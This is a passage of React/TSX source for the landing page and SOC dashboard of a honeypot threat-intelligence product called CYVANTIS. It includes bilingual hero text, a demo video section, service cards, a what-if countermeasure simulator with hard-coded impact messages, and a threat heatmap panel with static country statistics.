                {lang === 'EN' ? (
                  <>
                    Deceive. <span className="text-[#C8F904]">Detect.</span><br />
                    Neutralize. <span className="text-[#6967FB]">Every Threat.</span>
                  </>
                ) : (
                  <>
                    छलावा दें। <span className="text-[#C8F904]">पहचानें।</span><br />
                    निष्प्रभावी करें। <span className="text-[#6967FB]">हर खतरा।</span>
                  </>
                )}
              </h1>

              <p className="text-base text-[#9FB0B7] max-w-xl leading-relaxed font-sans">
                {lang === 'EN'
                  ? "CYVANTIS is an enterprise honeypot threat intelligence platform delivering Cowrie decoy deception, AI-assisted threat monitoring, real-time telemetry streaming, and automated incident investigation — protecting modern digital infrastructure."
                  : "CYVANTIS एक उन्नत साइबर सुरक्षा प्लेटफ़ॉर्म है जो Cowrie honeypot deception, AI आधारित थ्रेट विश्लेषण, और रियल-टाइम स्ट्रीम से आपके डिजिटल इंफ्रास्ट्रक्चर की सुरक्षा करता है।"
                }
              </p>

              <div className="pt-4 flex flex-col sm:flex-row items-center gap-4">
                <button
                  onClick={() => setIsDemoModalOpen(true)}
                  className="w-full sm:w-auto btn-lime py-3.5 px-8 text-sm"
                >
                  <span>{lang === 'EN' ? 'BOOK FREE DEMO' : 'मुफ्त डेमो बुक करें'}</span>
                  <ArrowRight className="w-4 h-4" />
                </button>

                <button
                  onClick={onLoginClick}
                  className="w-full sm:w-auto btn-secondary py-3.5 px-8 text-sm"
                >
                  <span>SIGN IN TO CONSOLE</span>
                </button>
              </div>

              {/* Key Metrics with Glass Spacing */}
              <div className="pt-8 grid grid-cols-3 gap-6 border-t border-[#6967FB]/20 max-w-lg">
                <div>
                  <p className="text-2xl sm:text-3xl font-black text-white font-mono">248+</p>
                  <p className="text-[10px] font-bold text-[#9FB0B7] font-mono uppercase tracking-wider mt-1">CAPTURED ATTACKS</p>
                </div>
                <div>
                  <p className="text-2xl sm:text-3xl font-black text-[#C8F904] font-mono">&lt; 12ms</p>
                  <p className="text-[10px] font-bold text-[#9FB0B7] font-mono uppercase tracking-wider mt-1">STREAM LATENCY</p>
                </div>
                <div>
                  <p className="text-2xl sm:text-3xl font-black text-[#6967FB] font-mono">100%</p>
                  <p className="text-[10px] font-bold text-[#9FB0B7] font-mono uppercase tracking-wider mt-1">DECEPTION RATE</p>
                </div>
              </div>
            </div>

            {/* Right Holographic Glass Emblem (No Pill, Modern Geometric) */}
            <div className="lg:col-span-5 relative flex items-center justify-center min-h-[420px]">
              <div className="bubble-plain w-72 h-72 bubble-lime opacity-20" />

              <div
                className="relative z-20 w-44 h-44 rounded-3xl bg-[#0E1A1F]/90 backdrop-blur-2xl border-2 border-[#6967FB] hover:border-[#C8F904] flex flex-col items-center justify-center shadow-[0_0_50px_rgba(105,103,251,0.35)] transition-all duration-300 hover:scale-105 cursor-pointer"
                onClick={onLoginClick}
              >
                <ShieldCheck className="w-16 h-16 text-[#C8F904] drop-shadow-[0_0_15px_rgba(200,249,4,0.6)]" />
                <span className="text-[11px] font-mono font-bold text-white tracking-widest mt-2">CYVANTIS</span>
                <span className="text-[9px] font-mono text-[#C8F904]">ENTER SOC →</span>
              </div>
            </div>
          </div>
        </header>

        {/* Space Education Inspired 3D Cyber Planet & Planetary Orbit Showcase */}
        <SpaceCyberShowcase
          onLoginClick={onLoginClick}
          onOpenVideoModal={() => setIsVideoModalOpen(true)}
          onOpenTour={() => setIsOnboardingTourOpen(true)}
        />

        {/* Showcase / Product Walkthrough Video Section */}
        <section id="showcase" className="py-20 px-6 sm:px-8 max-w-7xl mx-auto z-10 relative">
          <div className="text-center max-w-3xl mx-auto mb-12">
            <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#C8F904]/10 border border-[#C8F904]/30 text-[#C8F904] text-xs font-mono font-bold tracking-wider mb-4 shadow-[0_0_15px_rgba(200,249,4,0.2)]">
              <span className="w-2 h-2 rounded-full bg-[#C8F904] animate-ping" />
              <span>LIVE MOTION GRAPHIC WALKTHROUGH</span>
            </div>
            <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight font-mono">
              Next-Gen Autonomous SOC in Motion
            </h2>
            <p className="text-[#9FB0B7] text-sm sm:text-base mt-3 max-w-2xl mx-auto font-sans leading-relaxed">
              Experience the real-time deception engine in action — from live Cowrie honeypot intrusion capture and WebSocket telemetry feeds to interactive geo-threat mapping and automated defense guardrails.
            </p>
          </div>

          {/* Cyber Video Frame */}
          <div className="relative rounded-2xl sm:rounded-3xl border-2 border-[#6967FB]/40 bg-[#0E1A1F]/90 backdrop-blur-2xl p-2 sm:p-4 shadow-[0_0_80px_rgba(105,103,251,0.25),0_30px_60px_rgba(0,0,0,0.9)] overflow-hidden group">
            {/* Cyber Corner Accent Brackets */}
            <div className="tech-corner-tl" />
            <div className="tech-corner-tr" />
            <div className="tech-corner-bl" />
            <div className="tech-corner-br" />

            {/* Video Header Control Bar */}
            <div className="flex items-center justify-between px-3 sm:px-5 py-3 border-b border-[#6967FB]/30 bg-[#091114]/90 rounded-t-xl mb-3 font-mono text-xs text-[#9FB0B7]">
              <div className="flex items-center gap-3">
                <div className="flex items-center gap-1.5">
                  <span className="w-3 h-3 rounded-full bg-red-500/80 inline-block" />
                  <span className="w-3 h-3 rounded-full bg-amber-500/80 inline-block" />
                  <span className="w-3 h-3 rounded-full bg-[#C8F904]/80 inline-block" />
                </div>
                <span className="hidden sm:inline-block text-[#C8F904] font-bold">
                  CYVANTIS_PLATFORM_WALKTHROUGH.REC
                </span>
                <span className="text-[10px] px-2 py-0.5 rounded bg-[#6967FB]/20 border border-[#6967FB]/40 text-[#6967FB] font-bold">
                  1080P • 60 FPS
                </span>
              </div>

              <div className="flex items-center gap-2 sm:gap-4">
                <div className="flex items-center gap-1.5 text-[#C8F904]">
                  <span className="w-2 h-2 rounded-full bg-[#C8F904] animate-pulse" />
                  <span className="text-[11px] font-bold">ACTIVE TELEMETRY</span>
                </div>
                <button
                  type="button"
                  onClick={() => setIsVideoModalOpen(true)}
                  className="px-2.5 py-1 rounded-lg bg-[#6967FB]/20 hover:bg-[#6967FB]/40 border border-[#6967FB]/40 text-white text-[11px] transition flex items-center gap-1.5 cursor-pointer"
                  title="Expand to Fullscreen Lightbox"
                >
                  <Eye className="w-3.5 h-3.5 text-[#C8F904]" />
                  <span className="hidden sm:inline">Fullscreen</span>
                </button>
              </div>
            </div>

            {/* Video Canvas Container */}
            <div
              className="relative rounded-xl overflow-hidden cursor-pointer bg-black/60 aspect-[16/9] flex items-center justify-center border border-white/5"
              onClick={() => setIsVideoModalOpen(true)}
            >
              <img
                src="/cyvantis_demo.webp"
                alt="CYVANTIS Platform Interactive Video Walkthrough"
                className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-[1.01]"
              />

              {/* Ambient Cyber Overlay Vignette */}
              <div className="absolute inset-0 bg-gradient-to-t from-[#0E1A1F] via-transparent to-transparent opacity-60 pointer-events-none" />

              {/* Overlay Interactive Play Badge (Appears on Hover) */}
              <div className="absolute inset-0 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity duration-300 bg-black/30 backdrop-blur-[2px]">
                <div className="px-5 py-3 rounded-2xl bg-[#0E1A1F]/90 border border-[#C8F904] shadow-[0_0_30px_rgba(200,249,4,0.5)] flex items-center gap-3 text-white font-mono text-sm">
                  <Play className="w-5 h-5 text-[#C8F904] fill-[#C8F904]" />
                  <span className="font-bold">CLICK TO EXPAND HD WALKTHROUGH</span>
                </div>
              </div>

              {/* Corner Live Telemetry Badges */}
              <div className="absolute top-4 left-4 pointer-events-none hidden sm:flex flex-col gap-2 font-mono text-[11px]">
                <div className="px-3 py-1.5 rounded-lg bg-[#0E1A1F]/80 backdrop-blur-md border border-[#6967FB]/40 text-white flex items-center gap-2">
                  <Radio className="w-3.5 h-3.5 text-[#C8F904] animate-pulse" />
                  <span>WS FEED: LIVE (11ms)</span>
                </div>
                <div className="px-3 py-1.5 rounded-lg bg-[#0E1A1F]/80 backdrop-blur-md border border-[#C8F904]/40 text-[#C8F904] flex items-center gap-2">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>DECEPTION ACCURACY: 100%</span>
                </div>
              </div>
            </div>

            {/* Bottom Interactive Feature Chapters Grid */}
            <div className="mt-4 grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 font-mono">
              <div
                onClick={onLoginClick}
                className="p-3.5 rounded-xl bg-[#091114]/80 border border-[#6967FB]/30 hover:border-[#C8F904] transition cursor-pointer group/card"
              >
                <div className="text-[10px] text-[#C8F904] font-bold">01 // OVERVIEW</div>
                <div className="text-xs sm:text-sm font-bold text-white group-hover/card:text-[#C8F904] mt-1">SOC Control Hub</div>
                <div className="text-[10px] text-[#9FB0B7] normal-case mt-0.5">Real-time incident gauges & threat counters</div>
              </div>

              <div
                onClick={onLoginClick}
                className="p-3.5 rounded-xl bg-[#091114]/80 border border-[#6967FB]/30 hover:border-[#C8F904] transition cursor-pointer group/card"
              >
                <div className="text-[10px] text-[#6967FB] font-bold">02 // TELEMETRY</div>
                <div className="text-xs sm:text-sm font-bold text-white group-hover/card:text-[#C8F904] mt-1">Live Event Stream</div>
                <div className="text-[10px] text-[#9FB0B7] normal-case mt-0.5">Sub-12ms WebSocket packet inspection</div>
              </div>

              <div
                onClick={onLoginClick}
                className="p-3.5 rounded-xl bg-[#091114]/80 border border-[#6967FB]/30 hover:border-[#C8F904] transition cursor-pointer group/card"
              >
                <div className="text-[10px] text-[#C8F904] font-bold">03 // GEOSPATIAL</div>
                <div className="text-xs sm:text-sm font-bold text-white group-hover/card:text-[#C8F904] mt-1">Threat Interception Radar</div>
                <div className="text-[10px] text-[#9FB0B7] normal-case mt-0.5">Global IP origin mapping & attack vector paths</div>
              </div>

              <div
                onClick={onLoginClick}
                className="p-3.5 rounded-xl bg-[#091114]/80 border border-[#6967FB]/30 hover:border-[#C8F904] transition cursor-pointer group/card"
              >
                <div className="text-[10px] text-[#6967FB] font-bold">04 // DEFENSIVE</div>
                <div className="text-xs sm:text-sm font-bold text-white group-hover/card:text-[#C8F904] mt-1">Defense Suite & Tools</div>
                <div className="text-[10px] text-[#9FB0B7] normal-case mt-0.5">Automated guardrails & MITRE ATT&CK testing</div>
              </div>
            </div>

            {/* CTA Strip */}
            <div className="mt-4 pt-4 border-t border-[#6967FB]/20 flex flex-wrap items-center justify-between gap-4">
              <div className="flex items-center gap-2 text-xs font-mono text-[#9FB0B7]">
                <Sparkles className="w-4 h-4 text-[#C8F904]" />
                <span>Ready to experience the platform live in your browser?</span>
              </div>
              <div className="flex items-center gap-3">
                <button
                  type="button"
                  onClick={onLoginClick}
                  className="btn-lime py-2 px-5 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-2 cursor-pointer"
                >
                  <span>LAUNCH LIVE CONSOLE</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>
                <button
                  type="button"
                  onClick={() => setIsDemoModalOpen(true)}
                  className="btn-secondary py-2 px-4 text-xs font-mono cursor-pointer"
                >
                  <span>REQUEST ARCHITECTURE DEMO</span>
                </button>
              </div>
            </div>
          </div>
        </section>

        {/* Services Section */}
        <section id="services" className="py-24 px-6 max-w-7xl mx-auto border-b border-slate-800/80 z-10 relative">
          <div className="text-center max-w-3xl mx-auto mb-16">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#00d2ff]/10 border border-[#00d2ff]/30 text-[#00d2ff] text-xs font-mono mb-3">
              <Layers className="w-3.5 h-3.5" />
              <span>ENTERPRISE CYBERSECURITY SUITE</span>
            </div>
            <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight">
              Comprehensive Threat Mitigation Services
            </h2>
            <p className="text-slate-400 text-sm mt-3 font-sans max-w-xl mx-auto">
              Engineered specifically for active attack deception, real-time logging, and SOC administration.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {Object.entries(serviceDetails).map(([key, srv]: [string, any]) => (
              <div
                key={key}
                onClick={() => setSelectedServiceId(key)}
                className={`p-7 rounded-2xl border transition-all duration-300 group hover:-translate-y-1.5 shadow-xl relative overflow-hidden cursor-pointer ${isDarkOps ? 'bg-[#050505] border-neutral-800 hover:border-[#00d2ff]' : 'bg-[#060e26] border-slate-800 hover:border-[#00d2ff]/50'
                  }`}
              >
                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#00d2ff]/20 to-[#0072ff]/20 border border-[#00d2ff]/40 flex items-center justify-center text-[#00d2ff] mb-6 group-hover:scale-110 transition-transform">
                  {srv.icon}
                </div>
                <h3 className="text-xl font-bold text-white mb-2 group-hover:text-[#00d2ff] transition-colors">
                  {srv.title}
                </h3>
                <p className="text-slate-400 text-xs leading-relaxed font-sans mb-4">
                  {srv.summary}
                </p>
                <div className="pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono text-slate-400">
                  <span>{srv.badge}</span>
                  <span className="text-[#00d2ff] font-bold flex items-center gap-1 group-hover:translate-x-1 transition-transform">
                    Learn more <ChevronRight className="w-3.5 h-3.5" />
                  </span>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* Solutions: SOC Control Center with Smart Filters, Timeline, Density & Split Inspector */}
        <section id="solutions" className="py-24 px-6 max-w-7xl mx-auto">
          <div className="text-center max-w-3xl mx-auto mb-10">
            <h2 className="text-xs font-mono text-[#00d2ff] uppercase tracking-widest font-bold mb-1">CYVANTIS SOLUTIONS GATEWAY</h2>
            <h3 className="text-3xl sm:text-4xl font-bold text-white">Interactive SOC Control Center</h3>
            <p className="text-slate-400 text-xs mt-2 font-sans">
              Smart filter chips, saved views, timeline scrubber, and drill-down split-view inspector.
            </p>
          </div>

          {/* Main Control Center Container */}
          <div id="telemetry" className={`border rounded-3xl p-4 sm:p-7 shadow-[0_0_80px_rgba(0,210,255,0.15)] relative overflow-hidden transition-all duration-300 ${isWhatIfMode
            ? 'bg-[#030d2a]/95 border-blue-400 shadow-[0_0_100px_rgba(59,130,246,0.35)]'
            : isDarkOps ? 'bg-[#030303] border-neutral-800' : 'bg-[#060e26] border-[#00d2ff]/30'
            }`}>

            {/* Top Toolbar: Saved Views, Density, Export Wizard, Share Link, What-If, Scorecard */}
            <div className="bg-[#030716] border border-slate-800 rounded-2xl p-3.5 mb-6 flex flex-wrap items-center justify-between gap-4 text-xs font-mono">
              <div className="flex flex-wrap items-center gap-3">
                <span className="flex items-center gap-2 font-bold text-white">
                  <Monitor className="w-4 h-4 text-[#00d2ff]" />
                  SOC CONSOLE
                </span>

                {/* Feature 1: Saved Starred Views Dropdown */}
                <div className="flex items-center gap-1.5">
                  <select
                    value={activeSavedView}
                    onChange={(e) => handleSelectSavedView(e.target.value)}
                    className="bg-[#08122c] border border-slate-700 text-cyan-300 px-3 py-1.5 rounded-xl font-bold text-[11px] focus:outline-none focus:border-[#00d2ff]"
                  >
                    {savedViews.map(v => (
                      <option key={v.id} value={v.id}>{v.name}</option>
                    ))}
                  </select>

                  <button
                    onClick={handleSaveCurrentView}
                    className="p-1.5 rounded-lg bg-slate-900 border border-slate-800 text-amber-400 hover:text-white"
                    title="Star / Save current filter combination as preset"
                  >
                    <Star className="w-4 h-4 fill-current" />
                  </button>
                </div>
              </div>

              {/* Right Controls: Scorecard, Simulate What-If, Global Intel, Share, Export Wizard, Density */}
              <div className="flex flex-wrap items-center gap-2">
                {/* Feature 10: Security Scorecard Trigger */}
                <button
                  onClick={() => setIsScorecardOpen(true)}
                  className="px-3 py-1.5 rounded-xl bg-amber-500/15 border border-amber-500/40 text-amber-300 hover:bg-amber-500 hover:text-black font-bold flex items-center gap-1.5 transition text-[11px]"
                  title="View Organization Security Scorecard & Department Leaderboard"
                >
                  <Trophy className="w-3.5 h-3.5" />
                  <span>Scorecard</span>
                </button>

                {/* Feature 3: Kill Chain Simulator Mode (What-If) */}
                <button
                  onClick={() => {
                    setIsWhatIfMode(prev => !prev);
                    showToast(!isWhatIfMode ? "Kill Chain Simulator Activated (What-If Sandbox)" : "Exited What-If Simulation Sandbox");
                  }}
                  className={`px-3 py-1.5 rounded-xl font-bold flex items-center gap-1.5 transition text-[11px] ${isWhatIfMode
                    ? 'bg-blue-500 text-white shadow-[0_0_20px_rgba(59,130,246,0.6)] border border-blue-300 animate-pulse'
                    : 'bg-blue-500/15 border border-blue-500/40 text-blue-300 hover:bg-blue-500/30'
                    }`}
                  title="Toggle Kill Chain Simulator Sandbox (What-If Countermeasures)"
                >
                  <Sliders className="w-3.5 h-3.5" />
                  <span>{isWhatIfMode ? 'SIMULATING (WHAT-IF)' : 'Simulate'}</span>
                </button>

                {/* Feature 6: Global Threat Intel Heatmap Toggle */}
                <button
                  onClick={() => setShowGlobalHeatmap(prev => !prev)}
                  className={`px-3 py-1.5 rounded-xl border flex items-center gap-1.5 transition text-[11px] font-bold ${showGlobalHeatmap ? 'bg-purple-500 text-white border-purple-400' : 'bg-purple-500/15 border-purple-500/40 text-purple-300 hover:bg-purple-500/30'
                    }`}
                  title="Toggle Global Threat Intel Heatmap & Regional Surge Alerts"
                >
                  <Globe className="w-3.5 h-3.5" />
                  <span>Global Intel</span>
                </button>

                {/* Domain & DNS Intelligence Suite */}
                <button
                  onClick={() => setIsDomainIntelOpen(true)}
                  className="px-2.5 py-1.5 rounded-xl bg-cyan-500/15 border border-cyan-500/40 text-cyan-300 hover:bg-cyan-500 hover:text-black font-bold flex items-center gap-1.5 transition text-[11px]"
                  title="Open Domain & DNS Intelligence Suite (PDNS, DNSSEC, CT, WHOIS)"
                >
                  <Globe className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">Domain Intel</span>
                </button>

                {/* Cyber War Room & Offensive Suite */}
                <button
                  onClick={() => setIsCyberWarRoomOpen(true)}
                  className="px-2.5 py-1.5 rounded-xl bg-red-500/15 border border-red-500/40 text-red-300 hover:bg-red-500 hover:text-white font-bold flex items-center gap-1.5 transition text-[11px] shadow-[0_0_15px_rgba(239,68,68,0.2)]"
                  title="Open Cyber War Room (Lateral Movement, Cloud Hunter, API Fuzzer, Supply Chain, Red Team)"
                >
                  <Crosshair className="w-3.5 h-3.5" />
                  <span>War Room</span>
                </button>

                {/* Share Link Button (Feature 6) */}
                <button
                  onClick={handleShareDashboardLink}
                  className="px-2.5 py-1.5 rounded-xl bg-slate-900 border border-slate-700 text-slate-300 hover:text-[#00d2ff] flex items-center gap-1.5 transition text-[11px]"
                  title="Share current dashboard filter view URL"
                >
                  <Share2 className="w-3.5 h-3.5 text-[#00d2ff]" />
                  <span className="hidden sm:inline">Share</span>
                </button>

                {/* Export Wizard Trigger (Feature 9) */}
                <button
                  onClick={() => setIsExportWizardOpen(true)}
                  className="px-2.5 py-1.5 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 hover:bg-emerald-500 hover:text-black font-bold flex items-center gap-1.5 transition text-[11px]"
                  title="Export telemetry with format & column wizard"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">Export</span>
                </button>

                {/* Density Switch (Feature 4) */}
                <button
                  onClick={() => {
                    setDensity(prev => prev === 'comfortable' ? 'compact' : 'comfortable');
                    showToast(density === 'comfortable' ? "Compact table active" : "Comfortable table active");
                  }}
                  className={`px-2.5 py-1.5 rounded-xl border flex items-center gap-1.5 transition text-[11px] font-bold ${density === 'compact' ? 'bg-[#00d2ff] text-black border-[#00d2ff]' : 'bg-slate-900 border-slate-700 text-slate-300'
                    }`}
                  title="Toggle table row density (Comfortable / Compact)"
                >
                  <SlidersHorizontal className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>

            {/* FEATURE 3: THE KILL CHAIN SIMULATOR (WHAT-IF ANALYSIS SANDBOX) */}
            {isWhatIfMode && (
              <div className="mb-5 p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-blue-950/80 via-indigo-950/70 to-blue-900/80 border border-blue-400/60 shadow-[0_0_30px_rgba(59,130,246,0.3)] font-mono text-xs space-y-4 animate-in fade-in duration-200">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-blue-800/60 pb-3">
                  <div className="flex items-center gap-2 text-blue-300 font-bold">
                    <Sliders className="w-4 h-4 text-cyan-400 animate-spin" />
                    <span className="text-sm">Kill Chain Sandbox Mode (What-If Countermeasure Simulator)</span>
                  </div>
                  <span className="px-2.5 py-0.5 rounded-full bg-blue-500/20 text-blue-300 border border-blue-400/40 text-[10px] font-bold">
                    SIMULATION ENGINE ACTIVE (ZERO PROD IMPACT)
                  </span>
                </div>

                {/* Simulation Levers */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  {/* Lever 1: Perimeter Firewall */}
                  <div
                    onClick={() => {
                      setWhatIfFirewallBlocked(prev => !prev);
                      showToast(!whatIfFirewallBlocked ? "Simulated Perimeter Block: 4 lateral pivots stopped" : "Perimeter block simulation removed");
                    }}
                    className={`p-3 rounded-xl border cursor-pointer transition select-none flex flex-col justify-between ${whatIfFirewallBlocked
                      ? 'bg-blue-600/30 border-blue-400 text-white shadow-[0_0_15px_rgba(59,130,246,0.3)]'
                      : 'bg-[#02071a] border-slate-800 text-slate-400 hover:border-blue-500/50'
                      }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-bold flex items-center gap-1.5 text-xs text-white">
                        <Shield className="w-3.5 h-3.5 text-cyan-400" />
                        Block at Perimeter (-10m)
                      </span>
                      <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${whatIfFirewallBlocked ? 'bg-blue-400 text-black' : 'bg-slate-800'}`}>
                        {whatIfFirewallBlocked ? 'APPLIED' : 'OFF'}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-300 font-sans mt-2">
                      Retroactively tests if perimeter iptables drop 10m ago would have prevented downstream lateral pivots.
                    </p>
                  </div>

                  {/* Lever 2: Virtual Patch */}
                  <div
                    onClick={() => {
                      setWhatIfPatchApplied(prev => !prev);
                      showToast(!whatIfPatchApplied ? "Virtual Patch applied: RCE vector neutralized" : "Virtual patch simulation removed");
                    }}
                    className={`p-3 rounded-xl border cursor-pointer transition select-none flex flex-col justify-between ${whatIfPatchApplied
                      ? 'bg-purple-600/30 border-purple-400 text-white shadow-[0_0_15px_rgba(168,85,247,0.3)]'
                      : 'bg-[#02071a] border-slate-800 text-slate-400 hover:border-purple-500/50'
                      }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-bold flex items-center gap-1.5 text-xs text-white">
                        <Zap className="w-3.5 h-3.5 text-purple-400" />
                        Apply Virtual Patch v2.1
                      </span>
                      <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${whatIfPatchApplied ? 'bg-purple-400 text-black' : 'bg-slate-800'}`}>
                        {whatIfPatchApplied ? 'PATCHED' : 'OFF'}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-300 font-sans mt-2">
                      Patches TP-Link CVE-2023-1389. Recalculates next step from "Data Exfiltration" to "Lateral Movement Attempt".
                    </p>
                  </div>

                  {/* Lever 3: Honeypot Decoy Trap */}
                  <div
                    onClick={() => {
                      setWhatIfHoneypotPlaced(prev => !prev);
                      showToast(!whatIfHoneypotPlaced ? "Honeypot Decoy deployed: 82% probes diverted" : "Honeypot decoy removed");
                    }}
                    className={`p-3 rounded-xl border cursor-pointer transition select-none flex flex-col justify-between ${whatIfHoneypotPlaced
                      ? 'bg-emerald-600/30 border-emerald-400 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)]'
                      : 'bg-[#02071a] border-slate-800 text-slate-400 hover:border-emerald-500/50'
                      }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-bold flex items-center gap-1.5 text-xs text-white">
                        <Target className="w-3.5 h-3.5 text-emerald-400" />
                        Place Honeypot Decoy Lure
                      </span>
                      <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${whatIfHoneypotPlaced ? 'bg-emerald-400 text-black' : 'bg-slate-800'}`}>
                        {whatIfHoneypotPlaced ? 'ACTIVE' : 'OFF'}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-300 font-sans mt-2">
                      Deploys synthetic high-interaction trap. Simulates and logs attacker deception interaction.
                    </p>
                  </div>
                </div>

                {/* Live Simulation Calculated Impact */}
                {(whatIfFirewallBlocked || whatIfPatchApplied || whatIfHoneypotPlaced) && (
                  <div className="p-3 rounded-xl bg-blue-950/40 border border-blue-500/40 text-[11px] flex flex-wrap items-center justify-between gap-3 text-cyan-200">
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                      <span>
                        Simulated Countermeasure Impact:
                        {whatIfFirewallBlocked && <strong className="text-white ml-1">4 Lateral Pivots Prevented ·</strong>}
                        {whatIfPatchApplied && <strong className="text-purple-300 ml-1">RCE Neutralized (Next Step: Recon Only) ·</strong>}
                        {whatIfHoneypotPlaced && <strong className="text-emerald-300 ml-1">82% Probes Diverted to Decoy</strong>}
                      </span>
                    </div>
                    <span className="text-xs text-slate-400">Sandbox confidence: 97.4%</span>
                  </div>
                )}
              </div>
            )}

            {/* FEATURE 6: THREAT INTEL HEATMAP (GLOBAL CONTEXT & RUSSIAN PORT 3389 ALERT) */}
            {showGlobalHeatmap && (
              <div className="mb-5 p-4 rounded-2xl bg-[#03081e] border border-purple-500/40 shadow-xl font-mono text-xs space-y-3 animate-in fade-in duration-200">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
                  <div className="flex items-center gap-2 text-purple-300 font-bold">
                    <Globe className="w-4 h-4 text-cyan-400" />
                    <span>Global Threat Index & Regional Attack Vectors</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-400 border border-red-500/40 text-[10px] font-bold">
                      INDEX: 78/100 (HIGH ELEVATION)
                    </span>
                  </div>
                </div>

                {/* Real-time Trend Alert Ticker */}
                <div className="p-2.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center justify-between text-[11px] text-red-300">
                  <span className="flex items-center gap-1.5 font-bold">
                    <AlertTriangle className="w-3.5 h-3.5 text-red-400 shrink-0" />
                    🚨 TREND ALERT: 500+ new IPs from RU targeting port 3389 (RDP) in the last 10 minutes globally.
                  </span>
                  <span className="text-[10px] text-slate-400 hidden sm:inline">2 mins ago</span>
                </div>

                {/* Local vs Global Comparison */}
                <div className="p-3 rounded-xl bg-[#010410] border border-slate-800 text-[11px] text-slate-300">
                  <span className="text-cyan-400 font-bold">Local vs. Global Benchmark: </span>
                  Your network is observing <strong className="text-red-400">3.2x more SSH brute force</strong> than the global financial/tech industry average.
                </div>

                {/* Top Origin Countries Breakdown */}
                <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 pt-1">
                  {[
                    { country: "Russia (RU)", pct: "28%", vector: "RDP 3389 / SSH" },
                    { country: "China (CN)", pct: "24%", vector: "Web Exploits" },
                    { country: "Netherlands (NL)", pct: "16%", vector: "C2 / Tor" },
                    { country: "United States (US)", pct: "14%", vector: "Scanners" },
                    { country: "Brazil (BR)", pct: "8%", vector: "MikroTik Bots" }
                  ].map((item, idx) => (
                    <div key={idx} className="p-2 rounded-lg bg-[#020514] border border-slate-800 text-[10px]">
                      <div className="flex justify-between text-white font-bold">
                        <span>{item.country}</span>
                        <span className="text-[#00d2ff]">{item.pct}</span>
                      </div>
                      <span className="text-slate-400 text-[9px] block mt-0.5">{item.vector}</span>
                    </div>
                  ))}
                </div>

                {/* LIVE GEOGRAPHICAL GLOBAL OPERATIONS & THREAT MAP */}
                <div className="pt-3 border-t border-slate-800/80">
                  <GeographicalOperationsMap defaultMode="operations" />
                </div>
              </div>
            )}

            {/* Feature 1: Quick Filter Chips Strip */}
            <div className="flex flex-wrap items-center justify-between gap-3 mb-4 font-mono text-xs">
              <div className="flex flex-wrap items-center gap-2">
                <span className="text-slate-400 font-bold flex items-center gap-1 text-[11px]">
                  <Sparkles className="w-3 h-3 text-[#00d2ff]" />
                  Smart Chips:
                </span>

                <button
                  onClick={() => handleQuickChipClick('critical')}
                  className={`px-3 py-1.5 rounded-xl border text-[11px] font-bold transition flex items-center gap-1.5 ${activeQuickChip === 'critical' ? 'bg-red-500 text-white border-red-500 shadow-md shadow-red-500/30' : 'bg-[#030612] border-slate-800 text-slate-300 hover:border-red-500/50'
                    }`}
                >
                  <ShieldAlert className="w-3 h-3 text-red-400" />
                  <span>Only Critical</span>
                </button>

                <button
                  onClick={() => handleQuickChipClick('hour')}
                  className={`px-3 py-1.5 rounded-xl border text-[11px] font-bold transition flex items-center gap-1.5 ${activeQuickChip === 'hour' ? 'bg-[#00d2ff] text-black border-[#00d2ff]' : 'bg-[#030612] border-slate-800 text-slate-300 hover:border-[#00d2ff]/50'
                    }`}
                >
                  <Clock className="w-3 h-3 text-cyan-400" />
                  <span>Last 1 Hour</span>
                </button>

                <button
                  onClick={() => handleQuickChipClick('top5')}
                  className={`px-3 py-1.5 rounded-xl border text-[11px] font-bold transition flex items-center gap-1.5 ${activeQuickChip === 'top5' ? 'bg-amber-500 text-black border-amber-500' : 'bg-[#030612] border-slate-800 text-slate-300 hover:border-amber-500/50'
                    }`}
                >
                  <Flame className="w-3 h-3 text-amber-400" />
                  <span>Top 5 Attackers</span>
                </button>

                <button
                  onClick={() => handleQuickChipClick('failed_logins')}
                  className={`px-3 py-1.5 rounded-xl border text-[11px] font-bold transition flex items-center gap-1.5 ${activeQuickChip === 'failed_logins' ? 'bg-indigo-500 text-white border-indigo-500' : 'bg-[#030612] border-slate-800 text-slate-300 hover:border-indigo-500/50'
                    }`}
                >
                  <KeyRound className="w-3 h-3 text-indigo-400" />
                  <span>Failed Logins</span>
                </button>
              </div>

              {/* Pause / Resume Button */}
              <div className="flex items-center gap-2">
                <button
                  onClick={() => {
                    setIsFeedPaused(prev => !prev);
